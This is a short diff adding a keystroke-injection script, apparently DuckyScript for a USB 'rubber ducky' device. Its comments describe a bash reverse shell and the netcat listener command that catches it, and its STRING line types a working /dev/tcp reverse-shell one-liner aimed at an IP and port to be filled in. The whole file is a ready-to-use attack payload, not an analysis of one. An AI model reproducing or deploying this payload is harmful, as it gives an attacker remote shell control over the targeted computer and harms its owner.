@@ -1,0 +1,6 @@
+REM bash based reverse shell
+REM works with: nc -lvp 8080
+REM change ip and port accordingly
+DELAY 1000
+STRING ip=10.0.0.25;port=8080;bash -i >& /dev/tcp/$ip/$port 0>&1
+ENTER
